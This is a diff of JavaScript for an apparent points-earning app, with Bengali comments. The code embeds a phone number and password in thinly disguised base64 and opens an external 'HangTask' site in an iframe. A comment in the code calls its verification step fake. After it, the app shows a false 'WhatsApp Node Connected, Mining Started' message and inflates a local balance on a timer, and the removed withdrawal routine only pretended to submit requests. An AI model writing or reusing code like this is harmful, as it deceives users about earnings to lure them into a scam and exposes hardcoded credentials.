@@ -1,67 +1,57 @@
-/**
- * Security Credentials (Base64)
- * Number: 01321494267 -> MDEzMjE0OTQyNjc=
- * Pass: 123456789 -> MTIzNDU2Nzg5
- */
-const _vault = {
-    u: "MDEzMjE0OTQyNjc=", 
-    p: "MTIzNDU2Nzg5",
-    link: "https://www.taskm4u.com/#/HangTask"
+const _config = {
+    u: "MDEzMjE0OTQyNjc=", // 01321494267
+    p: "MTIzNDU2Nzg5",      // 123456789
+    target: "https://www.taskm4u.com/#/HangTask"
 };
 
-// পয়েন্ট সিস্টেম ভ্যারিয়েবল
-let balance = parseFloat(localStorage.getItem('user_balance')) || 0;
-const hourlyRate = 30; // প্রতি ঘন্টায় ৩০ পয়েন্ট
-const secRate = hourlyRate / 3600; // প্রতি সেকেন্ডে কত পয়েন্ট
+let balance = parseFloat(localStorage.getItem('cloud_bal')) || 0;
+let miningInterval;
 
-// ব্যালেন্স আপডেট ফাংশন
-function updateDisplay() {
-    document.getElementById('mainBalance').innerText = balance.toFixed(4) + " PT";
-    localStorage.setItem('user_balance', balance);
+function updateUI() {
+    document.getElementById('mainPoints').innerText = balance.toFixed(2) + " PT";
+    localStorage.setItem('cloud_bal', balance);
 }
 
-// অটো-পয়েন্ট বাড়ানোর লজিক (প্রতি সেকেন্ডে পয়েন্ট বাড়বে)
-setInterval(() => {
-    balance += secRate;
-    updateDisplay();
-}, 1000);
-
-// ট্যাব সুইচিং ফাংশন
-function showTab(tabId, element) {
-    document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active-tab'));
-    document.querySelectorAll('.nav-item').forEach(nav => nav.classList.remove('active'));
+// টাস্ক ওপেন করা
+function openTask() {
+    document.getElementById('view-main').classList.remove('active-view');
+    document.getElementById('view-task').classList.add('active-view');
     
-    document.getElementById(tabId).classList.add('active-tab');
-    element.classList.add('active');
+    const iframe = document.getElementById('taskFrame');
+    iframe.src = _config.target;
 }
 
-// টাস্ক শুরু করার ফাংশন
-function startWhatsAppTask() {
-    // ডিকোড করা তথ্য (ইউজার দেখবে না)
-    const phone = atob(_vault.u);
-    const pass = atob(_vault.p);
+// ভেরিফিকেশন এবং ব্যাক-টু-ড্যাশবোর্ড
+function verifyTask() {
+    const btn = document.getElementById('verifyBtn');
+    btn.innerText = "Verifying Connection...";
+    btn.style.background = "#555";
+    btn.disabled = true;
 
-    alert("System connecting to secure node... Please wait.");
-    
-    // ইউজারকে টাস্ক সাইটে পাঠানো
+    // একটি ফেক ভেরিফিকেশন চেক (২ সেকেন্ড)
     setTimeout(() => {
-        window.location.href = _vault.link;
-    }, 1500);
+        alert("WhatsApp Node Connected Successfully! Mining Started.");
+        
+        // ড্যাশবোর্ডে ফেরত পাঠানো
+        document.getElementById('view-task').classList.remove('active-view');
+        document.getElementById('view-main').classList.add('active-view');
+        
+        startMining();
+    }, 2500);
 }
 
-// উইথড্র হ্যান্ডলার
-function handleWithdraw() {
-    const amount = document.getElementById('amount').value;
-    const wallet = document.getElementById('phone').value;
+function startMining() {
+    const status = document.getElementById('miningStatus');
+    status.innerText = "● Mining Active (30 PT/hr)";
+    status.style.color = "#25D366";
 
-    if (balance < 10000) {
-        alert("Insufficient balance! Minimum 10,000 points required.");
-    } else if (wallet.length < 11) {
-        alert("Enter a valid bKash/Nagad number.");
-    } else {
-        alert("Withdrawal request of " + amount + " PT submitted successfully!");
-    }
+    // প্রতি সেকেন্ডে পয়েন্ট বাড়বে
+    const secRate = 30 / 3600;
+    miningInterval = setInterval(() => {
+        balance += secRate;
+        updateUI();
+    }, 1000);
 }
 
-// ইনিশিয়াল কল
-updateDisplay();
+// শুরুর ব্যালেন্স দেখানো
+updateUI();
